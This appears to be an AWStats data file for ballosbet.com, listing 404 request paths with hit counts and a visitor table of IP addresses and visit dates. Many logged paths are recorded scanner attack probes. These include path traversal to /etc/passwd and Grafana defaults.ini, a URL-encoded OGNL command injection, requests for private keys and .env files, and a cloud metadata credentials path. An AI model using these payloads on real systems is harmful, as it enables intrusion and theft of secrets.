+/public/plugins/yesoreyeram-boomtheme-panel/../../../../../conf/defaults.ini 1 -
+/php_info.php 2 -
+/crx/packmgr/list.jsp 1 https://ballosbet.com/
+/api/v1 2 -
+/public/plugins/larona-epict-panel/../../../../../conf/defaults.ini 1 -
+/wp-content/uploads/html2wp/32ry06QdX39JcDKoykHEDIoTFHC.php 2 -
+//certs/ballosbet.com.key 1 -
+/api/login/unlockGetData 2 -
+/cpt/manage/validate.jsp 1 -
+/file=web_assets/../config.json 1 -
+/magmi/web/magmi_run.php 1 -
+/ebvp/infopub/show_download_content 1 -
+/core/j_security_check 2 -
+/wp-admin/setup-config.php 9 -
+/Collector/diagnostics/trace_route 2 -
+/op/op.Login.php 2 -
+/token 2 -
+/32ry0aL631r9vZJKj7AT2ehsWb6.txt 5 -
+/32ry0BDf1EGEUhpOxSQzZ2OSA7p.php 2 -
+/public/plugins/grafana-polystat-panel/../../../../../conf/defaults.ini 1 -
+/crl/ 1 -
+/api/push 2 -
+/AgentBoard.XGI 2 -
+/service-worker.js 1 -
+/login/userverify.cgi 4 -
+/sysShell 2 -
+/v1/proxy/test 2 -
+/incom/modules/uploader/showcase/script.php 2 -
+/public/plugins/monitoringartist-monitoringart-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/flaminggoat-maptrack3d-panel/../../../../../conf/defaults.ini 1 -
+//.env.prod 2 -
+/public/plugins/yesoreyeram-infinity-datasource/../../../../../conf/defaults.ini 1 -
+/-/media/doo-doo.ashx 2 -
+/api/operations/ciscosb-file:form-file-upload 1 -
+/3ds.php 2 -
+/workflow/ 2 -
+/upload 3 -
+/ui/login.action 2 https://www.ballosbet.com//ui/login.action
+/ajax.php 3 -
+/NmConsole/Platform/PerformanceMonitorErrors/HasErrors 2 -
+/geoserver/TestWfsPost 2 -
+/public/plugins/belugacdn-app/../../../../../conf/defaults.ini 1 -
+/admin/server_import.php 1 -
+/author-sitemap.xml 2 -
+/kubepi/api/v1/systems/login/logs/search 2 -
+/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData 2 -
+/controlloLogin.js 1 -
+/task/submit/ 2 -
+/public/plugins/grafana-db2-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/xychart/../../../../../conf/defaults.ini 1 -
+/zabbix/index.php 2 -
+/actutor/env 2 -
+/Collector/appliancesettings/applianceSettingsFileTransfer 2 -
+/OA_CGI/FNDWRR.exe 1 -
+/mifs/j_spring_security_check 2 https://www.ballosbet.com/mifs/user/login.jsp
+/public/plugins/table/../../../../../conf/defaults.ini 1 -
+/public/plugins/timomyl-breadcrumb-panel/../../../../../conf/defaults.ini 1 -
+/index.php/management/set_timezone 1 https://www.ballosbet.com/index.php/management/datetime
+/cgi-bin/sslvpnclient 2 -
+/poc.jsp 2 -
+/index.cfm/_api/json/v1/default/ 2 -
+/streampipes-backend/api/v2/auth/settings 2 -
+/apply_sec.cgi 5 https://www.ballosbet.com//login_pic.asp
+/ztp/cgi-bin/handler 3 -
+/.env.production 6 -
+/public/plugins/mtanda-histogram-panel/../../../../../conf/defaults.ini 1 -
+/content/32ry0ltSMZg1lsGVCjFUEQqKi8J 1 https://www.ballosbet.com/
+/api/v1/users/admin 2 -
+/solr/admin/info/properties:/admin/info/key 2 -
+/_search 2 -
+/backend/backend/auth/signin 4 -
+/netcore_get.cgi 2 -
+/public/login.htm 3 https://www.ballosbet.com
+/jbpm-console/app/j_security_check 7 -
+/public/plugins/heatmap/../../../../../conf/defaults.ini 1 -
+/api/system/ExecuteSqlForSingle 2 -
+/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini 2 -
+/internal/security/login 2 https://www.ballosbet.com/login
+/fpui/loginServlet 1 -
+/MUP/ 2 ballosbet.com/MUP
+/internal/v2/config/mps_secret/ADM_SESSIONID 2 https://ballosbet.com/admin_ui/mas/ent/html/main.html
+/php/components/logs.php 2 -
+/public/plugins/grafana-splunk-datasource/../../../../../conf/defaults.ini 1 -
+/seeyon/rest/authentication/ucpcLogin 2 -
+/authenticate 2 -
+/general/index/UploadFile.php 4 -
+/public/plugins/praj-ams-datasource/../../../../../conf/defaults.ini 1 -
+/R9iPortal/32ry0mo2Cvc8ejpcVqkLEf00UNY.jsp 1 -
+/api/2.0/mlflow-artifacts/artifacts/32ry0H1MYAko8pPw0pCgJ3ahZdb 1 -
+/system/sharedir.php 1 -
+/index.php/User/doLogin 3 -
+/public/plugins/ddurieux-glpi-app/../../../../../conf/defaults.ini 1 -
+/.env_1 3 -
+/ws-api/v2/users/me/details 2 -
+/Collector/nms/addModifyZTDProxy 2 -
+/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx 2 -
+/openmrs/ws/rest/v1/xxxxxx 1 -
+/auth/check 3 -
+/%C0%AE/WEB-INF/web.xml 1 -
+/json/setup-restore.action 2 -
+/x 2 -
+/public/plugins/grafana-k6cloud-datasource/../../../../../conf/defaults.ini 1 -
+/admin/login 10 -
+/mobile/api/api.ali.php 2 -
+/public/plugins/bosun-app/../../../../../conf/defaults.ini 1 -
+/wp-content/plugins/stopbadbots/assets/js/stopbadbots.js 1 -
+/v1/backend1 1 -
+/wp-json/lp/v1/courses/archive-course 2 -
+/public/plugins/abhisant-druid-datasource/../../../../../conf/defaults.ini 1 -
+//WEB-INF/web.xml 1 -
+/tplus/SM/SetupAccount/Upload.aspx 1 -
+/public/plugins/andig-darksky-datasource/../../../../../conf/defaults.ini 1 -
+/webui/application/get_saml_request 2 -
+/merchant/code 2 -
+//cert/ballosbet.com.txt 1 -
+//certsrv/ 1 -
+/api/file/formimage 2 -
+/spcgi.cgi 2 -
+/public/plugins/blackcowmoo-googleanalytics-datasource/../../../../../conf/defaults.ini 1 -
+/plugins/ueditor/php/controller.php 1 -
+/public/plugins/gridprotectionalliance-osisoftpi-datasource/../../../../../conf/defaults.ini 1 -
+/api/imageProxy 1 -
+/console/index.html 2 -
+/status.htm 2 -
+/solr/admin/cores 14 -
+/solr/gettingstarted_shard1_replica_n1/config 2 -
+/installer/index.php 2 -
+/portal/loginpage.aspx 2 -
+/install/includes/configure.php 2 -
+/public/plugins/nline-plotlyjs-panel/../../../../../conf/defaults.ini 1 -
+/evo-apigw/evo-oauth/oauth/token 2 -
+/jars/upload 3 -
+/public/plugins/ibm-apm-datasource/../../../../../conf/defaults.ini 1 -
+//.%25%2532%2565/.%25%2532%2565/.%25%2532%2565/.%25%2532%2565/.%25%2532%2565/.%25%2532%2565/.%25%2532%2565/windows/win.ini 1 -
+/webtools/control/ProgramExport 2 -
+/zms/admin/index.php 1 https://www.ballosbet.com//zms/admin/index.php
+/cyrus.index.php 2 -
+/wp-content/plugins/gallery-plugin/upload/files/lboqw.png 1 -
+//.env.dev.local 3 -
+/console/auth/login 2 -
+/public/plugins/hawkular-datasource/../../../../../conf/defaults.ini 1 -
+/index.htm 1 -
+//config.php.new 1 -
+/public/plugins/grafana-databricks-datasource/../../../../../conf/defaults.ini 1 -
+/nagios/side.php 4 -
+/public/plugins/moogsoft-aiops-app/../../../../../conf/defaults.ini 1 -
+/ssl-vpn/hipreport.esp 2 -
+/Onboarding/Import 2 -
+/admin/asign-single-student-subjects.php 2 -
+/wp-json/sure-triggers/v1 1 -
+/public/plugins/grafana-es-open-distro-datasource/../../../../../conf/defaults.ini 1 -
+/v.1.5/php/features/feature-transfer-export.php 4 https://www.ballosbet.com/v.1.5/php/features/feature-transfer-export.php
+/clusterMgr/2Dnefu.jsp 1 -
+/eps/resourceOperations/upload.action 2 -
+/seeyon/thirdpartyController.do 2 -
+/32ry0PA3XaNRHXF1ptUB0i8RdHt.json 1 -
+/public/plugins/briangann-datatable-panel/../../../../../conf/defaults.ini 1 -
+/poc.jsp/ 3 -
+/attachements/cl6218.php 2 -
+/sys/ui/extend/varkind/custom.jsp 10 -
+/public/plugins/grafana-azure-data-explorer-datasource/../../../../../conf/defaults.ini 1 -
+/netflow/jspui/j_security_check 2 -
+/.well-known/pki-validation/ 1 -
+/api/v1/session 2 -
+/public/plugins/mysql/../../../../../conf/defaults.ini 1 -
+/public/plugins/gnocchixyz-gnocchi-datasource/../../../../../conf/defaults.ini 1 -
+/opennms/j_spring_security_check 2 https://ballosbet.com/opennms/login.jsp
+/public/plugins/speakyourcode-button-panel/../../../../../conf/defaults.ini 1 -
+/app/options.py 5 https://www.ballosbet.com//app/login.py
+/prop.htm 2 -
+//id_rsa_1024 1 -
+/GNRemote.dll 2 -
+/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet 4 -
+/bin/configurations/parsers/Checkpoint/CHECKPOINT.php 1 -
+/versa/login.html 2 -
+/public/plugins/grafana-datadog-datasource/../../../../../conf/defaults.ini 1 -
+/home/vugnq.php 2 -
+/userRpm/MenuRpm.htm 2 -
+/public/plugins/heatmap-new/../../../../../conf/defaults.ini 1 -
+/qvisdvr/ 2 -
+/.ssh/id_rsa_4096 1 -
+/member/authenticate 2 -
+/SamlResponseServlet 2 -
+/public/plugins/timeseries/../../../../../conf/defaults.ini 1 -
+/nagiosql/admin/menuaccess.php 3 -
+/ZMC_Admin_Login 2 -
+/./RestAPI/Connection 2 -
+/public/plugins/grafana-bigquery-datasource/../../../../../conf/defaults.ini 1 -
+/wp-json/post-smtp/v1/get-log 2 -
+//..%5c..%5c..%5c..%5cetc/passwd 1 -
+/wp-content/uploads/p3d/32ry0My9WGG3JNcXEdB9imCvSsD.php 2 -
+/cgi-bin/DownloadCfg/RouterCfm.jpg 1 -
+/..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/wls-wsat/CoordinatorPortType 10 -
+/_session 30 -
+/login/system 2 -
+/owa/auth/x.js 1 -
+/static/..%5Cetc/passwd 1 -
+/users/sign_in 10 -
+/rest/api/latest/repos 2 -
+/PKI/ 1 -
+/TransferredOutModal.php 2 -
+/mdm/serverurl 2 -
+//private/ballosbet.com.key 1 -
+//radio/application/configs/application.ini 1 -
+//miscadmin 8 -
+//server.key 1 -
+/../../../../etc/passwd 1 -
+/../../../../../../../../../etc/passwd 1 -
+/wp-json/lp/v1/load_content_via_ajax/ 2 -
+//phpmyadmin/server_import.php 1 -
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm 2 -
+/api/v1.index.article/getList.html 2 -
+/public/plugins/satellogic-3d-globe-panel/../../../../../conf/defaults.ini 1 -
+/CertEnroll/ 1 -
+/include/config.properties 2 -
+/api/v2/login 2 -
+/assets/app/something/services/AppModule.class/ 2 -
+/service.web 1 -
+/cgi-bin/ExportLogs.sh 2 -
+/wms 1 -
+/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 1 -
+/chat/completions 2 -
+/tiki-index.php 2 -
+/login.rst 8 -
+/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini 1 -
+/queue/join 4 -
+/uapim/static/pages/38/head.jsp 1 -
+/ViewPoint/admin/Site/ViewPointLogin 2 -
+/public/plugins/sni-pnp-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/alexandra-trackmap-panel/../../../../../conf/defaults.ini 1 -
+/cgi-bin/HsJ8KF.txt 3 -
+/api/v1/user/login 1 -
+/public/plugins/pyroscope-datasource/../../../../../conf/defaults.ini 1 -
+/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php 2 -
+/tmui/login.jsp/.. 1 -
+/public/plugins/grafana-synthetic-monitoring-app/../../../../../conf/defaults.ini 1 -
+/modules/cartabandonmentpro2/upload.php 1 -
+/CTCWebService/CTCWebServiceBean/ConfigServlet 1 -
+//..%5c..%5cetc/passwd 1 -
+/NmConsole/Platform/Filter/AlertCenterItemsReportThresholds 2 -
+/setting.php 2 -
+/public/plugins/pgillich-tree-panel/../../../../../conf/defaults.ini 1 -
+/general/login_code.php 2 -
+/public/plugins/udoprog-heroic-datasource/../../../../../conf/defaults.ini 1 -
+/wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php 1 -
+/ui/auth/login 1 -
+/api/hassio_ingress/.%09./supervisor/info 2 -
+/functionRouter 2 -
+/api/account/auth/form 8 -
+/meaweb/os/mxperson 2 -
+/public/plugins/elasticsearch/../../../../../conf/defaults.ini 1 -
+/file/Placard/upload/Imo_DownLoadUI.php 2 -
+/html/ad/adpesquisasql/request/processVariavel.php 2 -
+/authorize 2 -
+/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 1 -
+/admin/.env 4 -
+/fileserver/32ry0mIbu4amkujB4eafM20cd2o.txt 3 -
+//admin/phpMyAdmin/server_import.php 1 -
+/clients/editclient.php 3 -
+/public/plugins/tencentcloud-monitor-app/../../../../../conf/defaults.ini 1 -
+/vicidial/welcome.php 2 -
+/login_check.php 2 -
+/public/plugins/oci-metrics-datasource/../../../../../conf/defaults.ini 1 -
+/certsrv/ 1 -
+/hsqldb%0A 1 -
+/app/rest/users/id:1/tokens/32ry06W6TWXNFQammJIYj61K5KV 1 -
+/main/webservices/additional_webservices.php 3 -
+/default/en_US/status.html 24 -
+/server.key 1 -
+/j_security_check 8 https://www.ballosbet.com/
+/private/ballosbet.com.key 1 -
+//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini 1 -
+/public/plugins/dlopes7-appdynamics-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/paytm-kapacitor-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/sidewinder-datasource/../../../../../conf/defaults.ini 1 -
+/goanywhere/auth/Login.xhtml 2 -
+/public/plugins/cognitedata-datasource/../../../../../conf/defaults.ini 1 -
+/login.jsp 1 -
+/32ry0sUJ6s8hpZ3ZzbYPCEGwynR.jsp 1 -
+/autologin.php 2 -
+/ads.txt 5 -
+/form2saveConf.cgi 2 -
+/wlm/login 2 -
+/cgi-bin/ciwweb.pl 2 -
+/public/plugins/woutervh-mapbox-panel/../../../../../conf/defaults.ini 1 -
+/fileupload/toolsAny 2 -
+/attachment/9999999999/jab6r.php 2 -
+/pandora_console/ajax.php 3 -
+/webui_wsma_Http 2 -
+/wan.htm 2 -
+/servlet/FileReceiveServlet 1 -
+/public/plugins/hamedkarbasi93-kafka-datasource/../../../../../conf/defaults.ini 1 -
+/card_scan.php 2 -
+/api/v1/totp/user-backup-code/../../system/system-information 1 -
+/adminer/index.php 2 -
+/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X- 1 -
+//%c0%ae/WEB-INF/web.xml 1 -
+/admin/compass 2 -
+/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd 1 -
+/webadmin/index.php 2 -
+/api/v1/method.callAnon/getPasswordPolicy 2 -
+/public/checklogin.htm 2 -
+/service/~iufo/com.ufida.web.action.ActionServlet 4 -
+//%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml 1 -
+/tplus/img/login/32ry0p9xkZcfJW637ulwkTjDapD.jpg 1 -
+/public/plugins/grafana-mqtt-datasource/../../../../../conf/defaults.ini 1 -
+/template/custom/content-editor 2 -
+/public/plugins/scadavis-synoptic-panel/../../../../../conf/defaults.ini 1 -
+/OA/PM/svc.asmx 2 -
+/api/system/deviceinfo 2 https://ballosbet.com/
+/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini 1 -
+/public/plugins/golioth-websocket-datasource/../../../../../conf/defaults.ini 1 -
+/ssl/ballosbet.com.key 1 -
+/index.php/verifyLogin/login 2 -
+/php/ping.php 5 -
+/service/rapture/session 4 -
+/hsqldb%0a 1 -
+//mcmadmin 1 -
+/32ry0qlBp1Bo0lvPuAOuZiA3JPM.php%5Cx0A 2 -
+/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage 2 -
+/geoserver/j_spring_security_check 2 -
+/public/plugins/gauge/../../../../../conf/defaults.ini 1 -
+/api/timelion/run 2 -
+/partymgr/control/getJSONuiLabelArray 4 -
+//aplicacao/application/configs/application.ini 1 -
+/flexnet/logon.do 2 https://ballosbet.com/flexnet/logon.do
+/public/plugins/grafana-odbc-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/parca-datasource/../../../../../conf/defaults.ini 1 -
+/jwt/private.pem 1 -
+/simpleeditor/common/commonReleaseNotes.do 2 -
+/mobile/plugin/VerifyQuickLogin.jsp 2 -
+/emap/devicePoint_addImgIco 1 -
+//../../../../WEB-INF/web.xml 1 -
+//ssl/ballosbet.com.pem 1 -
+/wp-content/plugins/wp-file-upload/wfu_file_downloader.php 2 -
+/.git/ 2 -
+/ahbf.html 2 -
+//id_ed25519 1 -
+/zimbraAdmin/0MVzAe6pgwe5go1D.jsp 2 -
+/auth/token 2 -
+/cs/Satellite 4 -
+//CertEnroll/ 1 -
+/login/ 2 -
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc 4 -
+/fileserver/32ry0ovHpBgscqqCgnPkYssLpmH.txt 1 -
+/cgi-bin/file_transfer.cgi 2 -
+/public/plugins/fatcloud-windrose-panel/../../../../../conf/defaults.ini 1 -
+/.well-known/security.txt 2 -
+//static/..%5c..%5c..%5cetc/passwd 1 -
+/__debugging_center_utils___.php 8 -
+/docs/1.0/ 2 -
+https://ballosbet.com//latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 1 -
+/public/plugins/grafana-strava-datasource/../../../../../conf/defaults.ini 1 -
+/progs/homepage 2 -
+/_async/AsyncResponseService 2 -
+/api/whoami 2 -
+/api/login 3 -
+/api/v1/config 2 -
+/public/plugins/groonga-datasource/../../../../../conf/defaults.ini 1 -
+/var 2 https://www.ballosbet.com/
+/private-key 1 -
+/as/wapi/vmp 4 -
+/cgi-bin/../../../../../../bin/sh 1 -
+/Server/CmxUser.php 2 -
+/api/fabric/device/status 2 -
+/pki/ 1 -
+/public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini 1 -
+/module/ph_simpleblog/list 4 -
+/public/plugins/knightss27-weathermap-panel/../../../../../conf/defaults.ini 1 -
+/reset-password/ 2 -
+/webui/login 2 -
+/wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js 1 -
+/c/router 4 -
+/public/plugins/canvas/../../../../../conf/defaults.ini 1 -
+/public/plugins/bilibala-echarts-panel/../../../../../conf/defaults.ini 1 -
+/E-mobile/App/System/Login/login_quick.php 2 -
+//.//WEB-INF/web.xml 1 -
+/tshirtecommerce/ajax.php 2 -
+/cgi-bin/mt/mt-xmlrpc.cgi 2 -
+/CFIDE/adminapi/base.cfc 2 -
+/admin/index.php 5 -
+/public/plugins/loki/../../../../../conf/defaults.ini 1 -
+/my.key 1 -
+/public/plugins/state/../../../../../conf/defaults.ini 1 -
+/certificates/ballosbet.com.pfx 1 -
+//var/jwt/private.pem 1 -
+/public/plugins/pierosavi-imageit-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/marcusolsson-dynamictext-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-k6-app/../../../../../conf/defaults.ini 1 -
+/pages/createpage-entervariables.action 5 -
+/public/plugins/grafana-discourse-datasource/../../../../../conf/defaults.ini 1 -
+/_adminer/index.php 2 -
+/wp-content/plugins/simple-file-list/ee-upload-engine.php 1 -
+/minio/webrpc 4 -
+/WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId 2 -
+/wp-json/eventin/v2/speakers/import 2 -
+/general/weibo/javascript/uploadify/uploadify.php 2 -
+/public/plugins/itrs-hub-datasource/../../../../../conf/defaults.ini 1 -
+/system/console/bundles 3 -
+/public/plugins/corpglory-chartwerk-panel/../../../../../conf/defaults.ini 1 -
+/texteditor.php 1 -
+/session/login 2 -
+/client.do 2 -
+/public/plugins/farski-blendstat-panel/../../../../../conf/defaults.ini 1 -
+/integration/saveGangster.action 3 -
+/api/authentication/login 10 -
+/static/..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/localhost.key 1 -
+/public/plugins/linksmart-hds-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/briangann-gauge-panel/../../../../../conf/defaults.ini 1 -
+/cms/content/list 4 -
+//.env.production 2 -
+/search/ 2 -
+/webservices/WebJobUpload.asmx 2 -
+/public/plugins/bargauge/../../../../../conf/defaults.ini 1 -
+/objects/bsJo.txt 2 -
+/systemController/showOrDownByurl.do 2 -
+/cgi-bin/login.cgi 8 -
+//application/configs/application.ini 1 -
+/public/plugins/mxswat-separator-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/performancecopilot-pcp-app/../../../../../conf/defaults.ini 1 -
+//common/config.php.new 1 -
+/cgi-bin/nas_sharing.cgi 2 -
+/cert/ballosbet.com_key.txt 2 -
+/versa/login 2 -
+/public/plugins/verticle-flowhook-datasource/../../../../../conf/defaults.ini 1 -
+/Partners/application/configs/application.ini 1 -
+/module/ueditor/php/action_upload.php 2 -
+/public/plugins/timomyl-organisations-panel/../../../../../conf/defaults.ini 1 -
+/ccms/dashboard.php 2 -
+/public/plugins/state-timeline/../../../../../conf/defaults.ini 1 -
+/public/plugins/marcusolsson-csv-datasource/../../../../../conf/defaults.ini 1 -
+/setup/setupadministrator.action 2 -
+/api/v1/database/9 10 -
+/service_transport/service.action 2 -
+/webtools/control/view/StatsSinceStart 2 -
+/nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml 2 -
+/goanywhere/lic/accept 1 -
+//ballosbet.com.key 1 -
+/api/v1/database/5 10 -
+/32rBXPXNG09R374CMUOcmVHCTgk.php%5Cx0A 2 -
+/certificates/ballosbet.com_priv.pem 1 -
+/api/v1/markdown/link:metadata 2 -
+//.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini 1 -
+/cpasm4/login 2 -
+//.env.live 3 -
+/wp-auto-login.php 2 -
+//ballosbet.com.pem 1 -
+/BSW_cxttongr.htm 4 -
+/public/plugins/prometheus/../../../../../conf/defaults.ini 1 -
+/public/plugins/kniepdennis-neo4j-datasource/../../../../../conf/defaults.ini 1 -
+/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/ 2 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 25 first Hits must be first (order not required for others)
+BEGIN_VISITOR 270
+165.227.66.203 988 988 12968290 20250918200450
+69.6.213.228 215 215 363349 20250930215753
+181.32.49.196 87 172 3537986 20250914201417
+190.108.78.182 60 124 4410779 20250914185031
+183.134.59.134 50 50 679522 20250928194518
+164.92.66.41 31 31 404671 20250917230231
+182.69.178.157 22 22 229074 20250916070000
+103.212.146.202 22 22 547132 20250919085949
+185.203.132.199 10 10 216100 20250921043210
+104.218.50.202 10 10 100923 20250916085512
+89.117.94.246 10 10 100811 20250916092634
+59.183.54.173 10 10 100923 20250916080009
+182.69.181.168 8 8 100319 20250917075910
+138.68.180.18 8 8 118288 20250927164608
+66.23.224.249 8 8 57564 20250927140644
+124.236.100.56 8 8 108692 20250926063004
+45.135.232.178 8 8 85376 20250928150853
+66.249.66.193 8 8 57148 20250917221736
+181.176.80.216 7 13 139635 20250930134057
+172.236.122.62 6 6 81498 20250928171704
+95.173.221.26 6 14 153027 20250921040805
+66.249.66.194 6 6 81738 20250917195511
+34.76.117.34 6 6 81684 20250916020000
+183.134.59.133 6 6 81684 20250914201008
+94.247.172.129 6 6 81560 20250929163939
+23.27.145.0 2 2 27166 20250930162633
+198.235.24.34 1 1 7834 20250927001344
+52.90.92.58 0 5 24422 
+66.249.66.10 2 2 1480 20250918011542
+44.223.60.12 3 8 108350 20250930100019
+95.177.180.85 3 8 108350 20250918212403
+101.36.108.9 4 4 54332 20250920060139
+60.13.6.29 0 1 4119 
+205.210.31.146 1 1 7834 20250922182046
+23.27.145.28 2 2 27166 20250927051438
+103.196.9.169 2 3 31347 20250916170112
+165.154.206.139 1 1 13583 20250918205021
+45.194.70.253 2 2 27166 20250920022741
+101.36.127.85 1 1 13583 20250918212822
+66.249.66.167 2 2 36778 20250917175503
+208.73.41.119 2 2 27166 20250928002609
+43.248.108.71 2 2 27166 20250925190244
+47.237.77.100 3 4 31812 20250920043023
+205.169.39.186 1 6 81184 20250920211752
+149.57.180.145 2 2 27228 20250917220954
+23.27.145.12 2 2 27166 20250920215005
+66.249.66.164 2 2 1458 20250918015019
+104.253.252.219 3 8 107015 20250927170129
+118.194.250.95 3 3 40749 20250920121545
+57.129.46.185 2 2 27166 20250928163937
+51.79.160.9 2 10 151460 20250918093810
+165.154.36.105 2 2 27166 20250920145350
+118.193.43.158 1 1 13583 20250920000426
+165.154.206.71 1 1 13583 20250918234831
+142.93.2.227 2 2 27228 20250915204658
+91.134.91.17 2 2 27228 20250917162050
+54.210.181.11 3 8 108350 20250926085241
+23.111.114.116 4 4 54456 20250915182013
+152.32.234.39 2 2 27166 20250920201507
+198.235.24.57 1 1 7740 20250926031534
+47.237.166.170 1 1 527 20250919080429
+35.172.138.108 1 1 13583 20250928081731
+54.90.15.42 2 2 27228 20250915092517
+101.36.108.133 2 2 27166 20250918215126
+23.27.145.31 2 2 27228 20250914191524
+34.122.147.229 0 5 24422 
+118.193.43.141 1 1 13583 20250919235533
+137.184.165.109 2 2 27228 20250917214301
+84.247.175.76 2 2 27166 20250928041557
+149.56.150.100 4 4 102142 20250915125124
+198.235.24.218 1 1 7834 20250922181430
+190.92.233.29 1 1 0 20250915095123
+23.27.145.82 2 2 27166 20250926223651
+23.27.145.29 2 2 27228 20250917150317
+101.36.106.89 3 3 40749 20250920170838
+95.177.163.4 4 4 54456 20250916213436
+3.83.12.30 2 3 31347 20250915170951
+152.32.209.62 2 2 27166 20250920125409
+3.129.62.3 1 1 13536 20250928211906
+23.27.145.204 2 2 27166 20250923210003
+201.230.200.247 1 7 85303 20250928204626
+89.104.110.121 0 1 4119 
+156.228.88.248 3 3 27166 20250924141547
+103.30.15.239 0 5 24422 
+118.193.57.62 2 2 27149 20250919212340
+54.237.114.90 2 3 31347 20250915033752
+198.23.231.57 2 2 27166 20250920233003
+64.247.196.27 4 10 107348 20250923044637
+152.32.128.214 2 2 27149 20250918225752
+23.27.145.64 2 2 27166 20250924182408
+185.177.72.48 0 8 9528 
+185.177.72.30 0 10 88360 
+185.197.195.89 2 2 27000 20250921074031
+49.49.221.240 2 2 27228 20250917063335
+101.36.108.191 3 3 40749 20250920094711
+192.104.34.34 4 4 54332 20250925144341
+165.154.182.174 1 1 13566 20250918192434
+149.57.180.153 2 2 27166 20250920034700
+23.82.110.233 4 5 55878 20250914182025
+23.27.145.164 2 2 27228 20250917153132
+178.16.53.98 3 3 10875 20250922003636
+152.32.245.186 3 3 40749 20250920032248
+54.87.211.34 2 2 27228 20250917085328
+34.123.170.104 2 6 41259 20250915175048
+45.194.70.248 2 2 27166 20250920170909
+44.210.88.43 3 9 111100 20250918170249
+123.58.213.118 4 4 54315 20250920043624
+205.169.39.78 4 4 54456 20250915044933
+52.90.233.85 3 8 108350 20250925081910
+147.185.132.162 2 2 101050 20250925224548
+128.1.44.38 2 2 27166 20250921005634
+184.72.120.97 3 8 108350 20250920075042
+23.27.145.10 2 2 27166 20250920200904
+8.219.244.128 4 5 32339 20250919080429
+143.110.208.98 2 2 27166 20250925012334
+173.249.4.191 3 3 40749 20250929203049
+165.154.206.250 1 1 13583 20250920141429
+123.160.223.73 2 2 27228 20250917171731
+101.36.127.24 3 3 40749 20250920202813
+185.177.72.22 0 4 35344 
+119.13.90.176 2 2 27228 20250915095135
+64.69.216.78 0 5 24422 
+103.4.251.175 0 1 1191 
+205.210.31.201 1 1 7740 20250923121501
+54.172.151.242 2 7 94750 20250918090424
+23.27.145.134 2 2 27228 20250917192517
+5.161.251.43 4 13 101782 20250918165812
+205.210.31.56 1 1 7834 20250930061106
+152.39.250.226 0 5 24422 
+152.53.246.211 2 2 27166 20250929013134
+78.46.88.115 2 2 27000 20250928212709
+137.184.83.167 2 2 27166 20250919192427
+100.25.150.171 3 8 108350 20250927102926
+54.196.214.23 0 5 24422 
+23.27.145.45 2 2 27228 20250916151318
+104.168.71.93 2 3 31347 20250916170041
+149.57.180.140 2 2 27132 20250918170152
+159.203.170.32 2 2 27166 20250925211115
+179.43.149.114 2 2 27166 20250923032950
+93.123.109.225 2 2 27166 20250919061734
+34.238.193.93 0 5 24422 
+23.27.145.89 2 2 27166 20250920160333
+149.57.180.158 2 2 27132 20250918150801
+18.208.176.44 3 8 108350 20250923085600
+69.160.160.58 0 5 27584 
+44.192.106.150 2 3 31347 20250915033757
+23.27.145.155 2 2 27166 20250923201024
+149.57.180.164 2 2 27228 20250917204003
+188.241.207.36 0 5 24422 
+106.75.23.247 2 2 27228 20250915223639
+130.180.239.90 2 2 27166 20250919151025
+179.6.144.36 5 13 151934 20250917155955
+149.57.180.125 2 2 27166 20250927211703
+139.99.236.81 1 5 75730 20250917225119
+144.217.135.156 3 3 27228 20250915125157
+149.57.180.98 2 2 27166 20250930041747
+156.237.34.242 2 2 27132 20250918084111
+54.236.28.122 3 8 108350 20250922075817
+118.194.250.22 1 1 13583 20250920212520
+159.223.228.187 2 2 27228 20250915181531
+18.236.97.223 0 10 48844 
+104.252.191.80 0 1 1191 
+18.224.192.118 2 2 27166 20250925205047
+149.57.180.27 2 2 27228 20250915193612
